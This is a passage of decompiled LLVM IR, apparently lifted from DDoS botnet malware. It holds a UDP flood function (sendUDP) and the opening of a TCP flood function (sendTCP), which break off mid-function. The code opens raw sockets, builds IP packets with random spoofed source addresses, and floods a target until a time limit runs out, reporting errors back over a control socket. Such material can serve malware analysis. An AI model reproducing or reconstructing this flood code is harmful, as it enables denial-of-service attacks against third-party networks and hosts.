  store i32 ptrtoint ([36 x i8*]* @global_var_1e7a4.390 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_e198 = call i32 @memcpy()
  %v0_e19c = call i32 @rand()
  %v1_e1ac = zext i32 %v0_e19c to i64
  %v4_e1ac = mul nuw nsw i64 %v1_e1ac, 954437177
  %v3_e1b01 = udiv i64 %v4_e1ac, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_e25c, label %dec_label_pc_e1fc

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e180
  %v3_e1bc3 = mul nuw nsw i64 %v3_e1b01, 4
  %v3_e1bc = trunc i64 %v3_e1bc3 to i32
  %v2_e1c4.neg = sub i32 %v0_e19c, %v3_e1bc
  %v3_e1c05 = mul nuw nsw i64 %v3_e1b01, 32
  %v3_e1c0 = trunc i64 %v3_e1c05 to i32
  %v2_e1c8 = sub i32 %v2_e1c4.neg, %v3_e1c0
  %v3_e1d8 = mul i32 %v2_e1c8, 4
  %v2_e1e4 = add i32 %v2_e1e0, %v3_e1d8
  %v1_e1e8 = inttoptr i32 %v2_e1e4 to i32*
  %v2_e1e8 = load i32, i32* %v1_e1e8, align 4
  %v5_e20c = call i32 @__libc_send(i32 %v3_e0e8, i32 %v2_e1e8, i32 65, i32 0)
  %v3_e220 = call i32 @__libc_connect(i32 %v3_e0e8, i32 %v2_e118, i32 16)
  %v2_e228 = call i32 @__GI_time(i32* null)
  %v5_e240 = icmp slt i32 %v2_e228, %v2_e238
  br i1 %v5_e240, label %dec_label_pc_e254, label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %dec_label_pc_e1fc
  %v1_e248 = call i32 @__GI_close(i32 %v3_e0e8)
  %v1_e250 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e1fc, %dec_label_pc_e244
  br label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e180, %dec_label_pc_e254
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_e180 ], [ 0, %dec_label_pc_e254 ]
  %v1_e260 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_e180

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_e118, { 0, 2, 1 }
  uselistorder i32 %v1_e10c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_e25c, { 1, 0 }
  uselistorder label %dec_label_pc_e254, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 57984, i32* %stack_var_-4, align 4
  %v2_e27c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e27c, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_e2a0 = icmp eq i32 %arg2, 0
  br i1 %v2_e2a0, label %dec_label_pc_e2a8, label %dec_label_pc_e2c0

dec_label_pc_e2a8:                                ; preds = %entry
  %v0_e2a8 = call i32 @rand_cmwc()
  br label %dec_label_pc_e2dc

dec_label_pc_e2c0:                                ; preds = %entry
  %v3_e2c8 = urem i32 %arg2, 65536
  %v1_e2d0 = call i32 @__GI_htons(i32 %v3_e2c8)
  br label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2a8, %dec_label_pc_e2c0
  %v3_e2ec = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_e2f4 = icmp eq i32 %v3_e2ec, 0
  br i1 %v2_e2f4, label %dec_label_pc_e2fc, label %dec_label_pc_e8e4

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2dc
  store i32 8, i32* @r2, align 4
  %v2_e310 = bitcast i32* %stack_var_-72 to i8*
  %v3_e310 = call i32 @__GI_memset(i8* %v2_e310, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_e320 = icmp eq i32 %arg4, 32
  br i1 %v7_e320, label %dec_label_pc_e328, label %dec_label_pc_e4ac

dec_label_pc_e328:                                ; preds = %dec_label_pc_e2fc
  store i32 17, i32* @r2, align 4
  %v3_e334 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_e344 = icmp eq i32 %v3_e334, 0
  br i1 %v2_e344, label %dec_label_pc_e34c, label %dec_label_pc_e364

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e328
  %v2_e350 = load i32, i32* @global_var_28570.50, align 4
  %v3_e35c = call i32 @sockprintf(i32 %v2_e350, i32 ptrtoint ([27 x i8]* @global_var_1e834.394 to i32))
  br label %dec_label_pc_e8e4

dec_label_pc_e364:                                ; preds = %dec_label_pc_e328
  %v3_e364 = load i32, i32* %stack_var_0, align 4
  %v1_e368 = add i32 %v3_e364, 1
  %v1_e370 = call i32 @malloc(i32 %v1_e368)
  %v2_e380 = icmp eq i32 %v1_e370, 0
  br i1 %v2_e380, label %dec_label_pc_e8e4, label %dec_label_pc_e388

dec_label_pc_e388:                                ; preds = %dec_label_pc_e364
  %v3_e388 = load i32, i32* %stack_var_0, align 4
  %v1_e38c = add i32 %v3_e388, 1
  store i32 %v1_e38c, i32* @r2, align 4
  %v2_e39c = inttoptr i32 %v1_e370 to i8*
  %v3_e39c = call i32 @__GI_memset(i8* %v2_e39c, i32 0)
  %v2_e3a8 = call i32 @makeRandomStr(i32 %v1_e370, i32 %v3_e388)
  %v2_e3b0 = call i32 @__GI_time(i32* null)
  %v2_e3bc = add i32 %v2_e3b0, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e3d8 = ptrtoint i32* %stack_var_-80 to i32
  %v3_e474 = mul i32 %arg8, 4
  %v3_e484 = mul i32 %arg8, 1000
  br label %dec_label_pc_e3d4.outer

dec_label_pc_e3d4.outer:                          ; preds = %dec_label_pc_e49c, %dec_label_pc_e46c, %dec_label_pc_e388
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_e388 ], [ %v1_e454, %dec_label_pc_e46c ], [ %v1_e454, %dec_label_pc_e49c ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_e388 ], [ 0, %dec_label_pc_e46c ], [ %v1_e4a0, %dec_label_pc_e49c ]
  br label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3d4.outer, %dec_label_pc_e444
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_e444 ], [ %stack_var_-120.0.ph, %dec_label_pc_e3d4.outer ]
  %v3_e3d4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_e3d4, i32* %r2.global-to-local, align 4
  %v6_e3f8 = call i32 @__libc_sendto(i32 %v3_e334, i32 %v1_e370, i32 %v3_e3d4, i32 0, i32 %v2_e3d8, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_e404 = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_e404, label %dec_label_pc_e40c, label %dec_label_pc_e450

dec_label_pc_e40c:                                ; preds = %dec_label_pc_e3d4
  br i1 %v2_e2a0, label %dec_label_pc_e418, label %dec_label_pc_e42c

dec_label_pc_e418:                                ; preds = %dec_label_pc_e40c
  %v0_e418 = call i32 @rand_cmwc()
  br label %dec_label_pc_e42c

dec_label_pc_e42c:                                ; preds = %dec_label_pc_e40c, %dec_label_pc_e418
  %v2_e430 = call i32 @__GI_time(i32* null)
  store i32 %v2_e430, i32* %r2.global-to-local, align 4
  %v8_e440 = icmp sgt i32 %v2_e430, %v2_e3bc
  br i1 %v8_e440, label %dec_label_pc_e8e4, label %dec_label_pc_e444

dec_label_pc_e444:                                ; preds = %dec_label_pc_e42c
  br label %dec_label_pc_e3d4

dec_label_pc_e450:                                ; preds = %dec_label_pc_e3d4
  %v1_e454 = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_e464 = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_e464, label %dec_label_pc_e46c, label %dec_label_pc_e49c

dec_label_pc_e46c:                                ; preds = %dec_label_pc_e450
  store i32 %v3_e474, i32* %r2.global-to-local, align 4
  %v1_e48c = call i32 @usleep(i32 %v3_e484)
  br label %dec_label_pc_e3d4.outer

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e450
  %v1_e4a0 = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_e4a0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e3d4.outer

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e2fc
  store i32 17, i32* @r2, align 4
  %v3_e4c0 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_e4d0 = icmp eq i32 %v3_e4c0, 0
  br i1 %v2_e4d0, label %dec_label_pc_e4d8, label %dec_label_pc_e4f0

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e4ac
  %v2_e4dc = load i32, i32* @global_var_28570.50, align 4
  %v3_e4e8 = call i32 @sockprintf(i32 %v2_e4dc, i32 ptrtoint ([27 x i8]* @global_var_1e834.394 to i32))
  br label %dec_label_pc_e8e0

dec_label_pc_e4f0:                                ; preds = %dec_label_pc_e4ac
  store i32 1, i32* %stack_var_-84, align 4
  %v2_e4f8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_e514 = call i32 @__GI_setsockopt(i32 %v3_e4c0, i32 0, i32 3, i32 %v2_e4f8, i32 4)
  %v1_e51c = icmp slt i32 %v5_e514, 0
  br i1 %v1_e51c, label %dec_label_pc_e524, label %dec_label_pc_e53c

dec_label_pc_e524:                                ; preds = %dec_label_pc_e4f0
  %v2_e528 = load i32, i32* @global_var_28570.50, align 4
  %v3_e534 = call i32 @sockprintf(i32 %v2_e528, i32 ptrtoint ([33 x i8]* @global_var_1e850.396 to i32))
  br label %dec_label_pc_e8e0

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e4f0
  br label %dec_label_pc_e548

dec_label_pc_e548:                                ; preds = %dec_label_pc_e53c, %dec_label_pc_e548
  %v1_e58023 = phi i32 [ 49, %dec_label_pc_e53c ], [ %v1_e580, %dec_label_pc_e548 ]
  %v2_e54c = call i32 @__GI_time(i32* null)
  store i32 %v2_e54c, i32* @r4, align 4
  %v0_e558 = call i32 @rand_cmwc()
  %v0_e560 = load i32, i32* @r4, align 4
  %v2_e560 = xor i32 %v0_e560, %v0_e558
  %v1_e568 = call i32 @srand(i32 %v2_e560)
  %v0_e56c = call i32 @rand()
  %v1_e578 = call i32 @init_rand(i32 %v0_e56c)
  %v1_e580 = add nsw i32 %v1_e58023, -1
  %v3_e58c = icmp eq i32 %v1_e58023, 0
  br i1 %v3_e58c, label %dec_label_pc_e594, label %dec_label_pc_e548

dec_label_pc_e594:                                ; preds = %dec_label_pc_e548
  %v2_e598 = icmp eq i32 %arg4, 0
  br i1 %v2_e598, label %dec_label_pc_e5c4, label %dec_label_pc_e5ac

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e594
  %v1_e5b0 = sub i32 32, %arg4
  store i32 %v1_e5b0, i32* %r2.global-to-local, align 4
  %v1_e5bc = shl i32 -1, %v1_e5b0
  br label %dec_label_pc_e5c4

dec_label_pc_e5c4:                                ; preds = %dec_label_pc_e594, %dec_label_pc_e5ac
  %storemerge10 = phi i32 [ %v1_e5bc, %dec_label_pc_e5ac ], [ 0, %dec_label_pc_e594 ]
  %v3_e5c4 = load i32, i32* %stack_var_0, align 4
  %v1_e5c8 = add i32 %v3_e5c4, 28
  %v1_e5d8 = add i32 %v3_e5c4, 42
  %v3_e5dc = and i32 %v1_e5d8, -8
  %v1_e5e4 = load i32, i32* @sp, align 4
  %v2_e5e4 = sub i32 %v1_e5e4, %v3_e5dc
  %v1_e5e8 = add i32 %v2_e5e4, 8
  store i32 %v1_e5e8, i32* %r2.global-to-local, align 4
  %v1_e5f4 = add i32 %v2_e5e4, 15
  %v3_e5f8 = and i32 %v1_e5f4, -8
  %v1_e618 = add i32 %v3_e5f8, 20
  %v5_e61c = inttoptr i32 %v1_e618 to i16*
  %v3_e620 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_e620, i32* @r4, align 4
  %v1_e628 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_e634 = call i32 @__GI_htonl(i32 %v1_e628)
  store i32 %v1_e634, i32* %r2.global-to-local, align 4
  %v3_e63c = load i32, i32* %stack_var_0, align 4
  %v1_e640 = add i32 %v3_e63c, 8
  %v1_e644 = load i32, i32* @sp, align 4
  %v2_e644 = inttoptr i32 %v1_e644 to i32*
  store i32 %v1_e640, i32* %v2_e644, align 4
  %v0_e64c = load i32, i32* @r4, align 4
  %v4_e654 = inttoptr i32 %v3_e5f8 to i8*
  %v5_e654 = call i32 @makeIPPacket(i8* %v4_e654, i32 %v0_e64c, i32 %v1_e634, i32 17)
  %v3_e658 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_e658, 8
  %v3_e66c = urem i32 %fold, 65536
  %v1_e674 = call i32 @__GI_htons(i32 %v3_e66c)
  %sext = mul i32 %v1_e674, 65536
  %v1_e678 = sdiv i32 %sext, 65536
  store i32 %v1_e678, i32* %r2.global-to-local, align 4
  %v1_e684 = trunc i32 %v1_e678 to i16
  %v3_e684 = add i32 %v3_e5f8, 24
  %v4_e684 = inttoptr i32 %v3_e684 to i16*
  store i16 %v1_e684, i16* %v4_e684, align 8
  %v0_e688 = call i32 @rand_cmwc()
  %v3_e694 = urem i32 %v0_e688, 65536
  store i32 %v3_e694, i32* %r2.global-to-local, align 4
  %v1_e69c = trunc i32 %v0_e688 to i16
  store i16 %v1_e69c, i16* %v5_e61c, align 4
  br i1 %v2_e2a0, label %dec_label_pc_e6ac, label %dec_label_pc_e6c4

dec_label_pc_e6ac:                                ; preds = %dec_label_pc_e5c4
  %v0_e6ac = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_e6ac to i16
  br label %dec_label_pc_e6e0

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e5c4
  %v3_e6cc = urem i32 %arg2, 65536
  %v1_e6d4 = call i32 @__GI_htons(i32 %v3_e6cc)
  %extract.t91 = trunc i32 %v1_e6d4 to i16
  br label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6ac, %dec_label_pc_e6c4
  %v0_e6ac.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_e6ac ], [ %extract.t91, %dec_label_pc_e6c4 ]
  %v3_e7cc.pre-phi = phi i32 [ 0, %dec_label_pc_e6ac ], [ %v3_e6cc, %dec_label_pc_e6c4 ]
  %v3_e6e8 = add i32 %v3_e5f8, 22
  %v4_e6e8 = inttoptr i32 %v3_e6e8 to i16*
  store i16 %v0_e6ac.sink.off0, i16* %v4_e6e8, align 2
  store i32 %v1_e618, i32* %r2.global-to-local, align 4
  %v3_e6f4 = add i32 %v3_e5f8, 26
  %v4_e6f4 = inttoptr i32 %v3_e6f4 to i16*
  store i16 0, i16* %v4_e6f4, align 2
  %v1_e6fc = add i32 %v3_e5f8, 28
  %v3_e704 = load i32, i32* %stack_var_0, align 4
  %v2_e708 = call i32 @makeRandomStr(i32 %v1_e6fc, i32 %v3_e704)
  store i32 %v3_e5f8, i32* %r2.global-to-local, align 4
  %v1_e718 = or i32 %v3_e5f8, 2
  %v2_e718 = inttoptr i32 %v1_e718 to i16*
  %v3_e718 = load i16, i16* %v2_e718, align 2
  %v4_e718 = zext i16 %v3_e718 to i32
  %v2_e724 = inttoptr i32 %v3_e5f8 to i16*
  %v3_e724 = call i32 @csum(i16* %v2_e724, i32 %v4_e718)
  %sext4 = mul i32 %v3_e724, 65536
  %v1_e728 = sdiv i32 %sext4, 65536
  store i32 %v1_e728, i32* %r2.global-to-local, align 4
  %v1_e734 = trunc i32 %v1_e728 to i16
  %v3_e734 = add i32 %v3_e5f8, 10
  %v4_e734 = inttoptr i32 %v3_e734 to i16*
  store i16 %v1_e734, i16* %v4_e734, align 2
  %v2_e73c = call i32 @__GI_time(i32* null)
  %v2_e748 = add i32 %v2_e73c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e764 = ptrtoint i32* %stack_var_-80 to i32
  %v3_e800 = or i32 %v3_e5f8, 4
  %v4_e800 = inttoptr i32 %v3_e800 to i16*
  %v2_e820 = add i32 %v3_e5f8, 12
  %v3_e820 = inttoptr i32 %v2_e820 to i32*
  %v3_e8a8 = mul i32 %arg8, 4
  %v3_e8b8 = mul i32 %arg8, 1000
  br label %dec_label_pc_e760.outer

dec_label_pc_e760.outer:                          ; preds = %dec_label_pc_e8d0, %dec_label_pc_e8a0, %dec_label_pc_e6e0
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_e6e0 ], [ %v1_e888, %dec_label_pc_e8a0 ], [ %v1_e888, %dec_label_pc_e8d0 ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_e6e0 ], [ 0, %dec_label_pc_e8a0 ], [ %v1_e8d4, %dec_label_pc_e8d0 ]
  br label %dec_label_pc_e760

dec_label_pc_e760:                                ; preds = %dec_label_pc_e760.outer, %dec_label_pc_e878
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_e878 ], [ %stack_var_-112.0.ph, %dec_label_pc_e760.outer ]
  store i32 %v3_e5f8, i32* %r2.global-to-local, align 4
  %v1_e768 = load i32, i32* @sp, align 4
  %v2_e768 = inttoptr i32 %v1_e768 to i32*
  store i32 %v2_e764, i32* %v2_e768, align 4
  %v1_e770 = load i32, i32* @sp, align 4
  %v2_e770 = add i32 %v1_e770, 4
  %v3_e770 = inttoptr i32 %v2_e770 to i32*
  store i32 16, i32* %v3_e770, align 4
  %v0_e778 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_e5c8, i32* %r2.global-to-local, align 4
  %v6_e784 = call i32 @__libc_sendto(i32 %v3_e4c0, i32 %v0_e778, i32 %v1_e5c8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_e788 = call i32 @rand_cmwc()
  %v3_e794 = urem i32 %v0_e788, 65536
  store i32 %v3_e794, i32* %r2.global-to-local, align 4
  %v1_e79c = trunc i32 %v0_e788 to i16
  store i16 %v1_e79c, i16* %v5_e61c, align 4
  br i1 %v2_e2a0, label %dec_label_pc_e7ac, label %dec_label_pc_e7c4

dec_label_pc_e7ac:                                ; preds = %dec_label_pc_e760
  %v0_e7ac = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_e7ac to i16
  br label %dec_label_pc_e7e0

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e760
  %v1_e7d4 = call i32 @__GI_htons(i32 %v3_e7cc.pre-phi)
  %extract.t93 = trunc i32 %v1_e7d4 to i16
  br label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7ac, %dec_label_pc_e7c4
  %v0_e7ac.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_e7ac ], [ %extract.t93, %dec_label_pc_e7c4 ]
  %v4_e7e4 = sext i16 %v0_e7ac.sink.off0 to i32
  store i32 %v4_e7e4, i32* %r2.global-to-local, align 4
  store i16 %v0_e7ac.sink.off0, i16* %v4_e6e8, align 2
  %v0_e7ec = call i32 @rand_cmwc()
  %v3_e7f8 = urem i32 %v0_e7ec, 65536
  store i32 %v3_e7f8, i32* %r2.global-to-local, align 4
  %v1_e800 = trunc i32 %v0_e7ec to i16
  store i16 %v1_e800, i16* %v4_e800, align 4
  %v1_e808 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_e814 = call i32 @__GI_htonl(i32 %v1_e808)
  store i32 %v1_e814, i32* %v3_e820, align 4
  store i32 %v3_e5f8, i32* %r2.global-to-local, align 4
  %v3_e830 = load i16, i16* %v2_e718, align 2
  %v4_e830 = zext i16 %v3_e830 to i32
  %v3_e83c = call i32 @csum(i16* %v2_e724, i32 %v4_e830)
  %v1_e84c = trunc i32 %v3_e83c to i16
  store i16 %v1_e84c, i16* %v4_e734, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_e858 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_e858, label %dec_label_pc_e860, label %dec_label_pc_e884

dec_label_pc_e860:                                ; preds = %dec_label_pc_e7e0
  %v2_e864 = call i32 @__GI_time(i32* null)
  store i32 %v2_e864, i32* %r2.global-to-local, align 4
  %v8_e874 = icmp sgt i32 %v2_e864, %v2_e748
  br i1 %v8_e874, label %dec_label_pc_e8e0, label %dec_label_pc_e878

dec_label_pc_e878:                                ; preds = %dec_label_pc_e860
  br label %dec_label_pc_e760

dec_label_pc_e884:                                ; preds = %dec_label_pc_e7e0
  %v1_e888 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_e898 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_e898, label %dec_label_pc_e8a0, label %dec_label_pc_e8d0

dec_label_pc_e8a0:                                ; preds = %dec_label_pc_e884
  store i32 %v3_e8a8, i32* %r2.global-to-local, align 4
  %v1_e8c0 = call i32 @usleep(i32 %v3_e8b8)
  br label %dec_label_pc_e760.outer

dec_label_pc_e8d0:                                ; preds = %dec_label_pc_e884
  %v1_e8d4 = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_e8d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e760.outer

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e860, %dec_label_pc_e524, %dec_label_pc_e4d8
  %v1_e8ec30 = phi i32 [ %v3_e534, %dec_label_pc_e524 ], [ %v3_e4e8, %dec_label_pc_e4d8 ], [ %v2_e864, %dec_label_pc_e860 ]
  br label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e42c, %dec_label_pc_e2dc, %dec_label_pc_e364, %dec_label_pc_e34c, %dec_label_pc_e8e0
  %v1_e8ec = phi i32 [ %v3_e2ec, %dec_label_pc_e2dc ], [ 0, %dec_label_pc_e364 ], [ %v3_e35c, %dec_label_pc_e34c ], [ %v1_e8ec30, %dec_label_pc_e8e0 ], [ %v2_e430, %dec_label_pc_e42c ]
  ret i32 %v1_e8ec

; uselistorder directives
  uselistorder i32 %v1_e8d4, { 1, 0 }
  uselistorder i32 %v1_e888, { 1, 0 }
  uselistorder i32 %v0_e7ec, { 1, 0 }
  uselistorder i16 %v0_e7ac.sink.off0, { 1, 0 }
  uselistorder i32 %v0_e788, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_e728, { 1, 0 }
  uselistorder i32 %v3_e6cc, { 1, 0 }
  uselistorder i32 %v0_e688, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v3_e5f8, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_e5c8, { 1, 0 }
  uselistorder i32 %v1_e4a0, { 1, 0 }
  uselistorder i32 %v1_e454, { 1, 0 }
  uselistorder i32 %v3_e3d4, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_e8e4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_e7e0, { 1, 0 }
  uselistorder label %dec_label_pc_e760, { 1, 0 }
  uselistorder label %dec_label_pc_e6e0, { 1, 0 }
  uselistorder label %dec_label_pc_e5c4, { 1, 0 }
  uselistorder label %dec_label_pc_e548, { 1, 0 }
  uselistorder label %dec_label_pc_e42c, { 1, 0 }
  uselistorder label %dec_label_pc_e3d4, { 1, 0 }
  uselistorder label %dec_label_pc_e2dc, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 59656, i32* %stack_var_-4, align 4
  %v2_e904 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e904, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_e938 = icmp eq i32 %arg2, 0
  br i1 %v2_e938, label %dec_label_pc_e940, label %dec_label_pc_e958

dec_label_pc_e940:                                ; preds = %entry
  %v0_e940 = call i32 @rand_cmwc()
  br label %dec_label_pc_e974

dec_label_pc_e958:                                ; preds = %entry
  %v3_e960 = urem i32 %arg2, 65536
  %v1_e968 = call i32 @__GI_htons(i32 %v3_e960)
  br label %dec_label_pc_e974

dec_label_pc_e974:                                ; preds = %dec_label_pc_e940, %dec_label_pc_e958
  %v3_e984 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_e98c = icmp eq i32 %v3_e984, 0
  br i1 %v2_e98c, label %dec_label_pc_e998, label %dec_label_pc_efd4

dec_label_pc_e998:                                ; preds = %dec_label_pc_e974
  store i32 8, i32* @r2, align 4
  %v2_e9ac = bitcast i32* %stack_var_-60 to i8*
  %v3_e9ac = call i32 @__GI_memset(i8* %v2_e9ac, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_e9bc = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_e9cc = icmp eq i32 %v3_e9bc, 0
  br i1 %v2_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_e9ec

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e998
  %v2_e9d8 = load i32, i32* @global_var_28570.50, align 4
  %v3_e9e4 = call i32 @sockprintf(i32 %v2_e9d8, i32 ptrtoint ([27 x i8]* @global_var_1e834.394 to i32))
  br label %dec_label_pc_efd4

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e998
  store i32 1, i32* %stack_var_-72, align 4
  %v2_e9f4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_ea10 = call i32 @__GI_setsockopt(i32 %v3_e9bc, i32 0, i32 3, i32 %v2_e9f4, i32 4)
  %v1_ea18 = icmp slt i32 %v5_ea10, 0
  br i1 %v1_ea18, label %dec_label_pc_ea20, label %dec_label_pc_ea38

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e9ec
  %v2_ea24 = load i32, i32* @global_var_28570.50, align 4
  %v3_ea30 = call i32 @sockprintf(i32 %v2_ea24, i32 ptrtoint ([33 x i8]* @global_var_1e850.396 to i32))
  br label %dec_label_pc_efd4

dec_label_pc_ea38:                                ; preds = %dec_label_pc_e9ec
  %v2_ea3c = icmp eq i32 %arg4, 0
  br i1 %v2_ea3c, label %dec_label_pc_ea68, label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %dec_label_pc_ea38
  %v1_ea54 = sub i32 32, %arg4
  store i32 %v1_ea54, i32* %r2.global-to-local, align 4
  %v1_ea60 = shl i32 -1, %v1_ea54
  br label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea38, %dec_label_pc_ea50
  %storemerge9 = phi i32 [ %v1_ea60, %dec_label_pc_ea50 ], [ 0, %dec_label_pc_ea38 ]
  %v1_ea6c = add i32 %arg6, 40
  %v1_ea7c = add i32 %arg6, 54
  %v3_ea80 = and i32 %v1_ea7c, -8
  %v1_ea88 = load i32, i32* @sp, align 4
  %v2_ea88 = sub i32 %v1_ea88, %v3_ea80
  %v1_ea98 = add i32 %v2_ea88, 15
  %v3_ea9c = and i32 %v1_ea98, -8
  store i32 %v3_ea9c, i32* %r2.global-to-local, align 4
  %v1_eabc = add i32 %v3_ea9c, 20
  %v5_eac0 = inttoptr i32 %v1_eabc to i16*
  %v3_eac4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_eac4, i32* @r4, align 4
  %v1_eacc = call i32 @GetRandomIP(i32 %storemerge9)
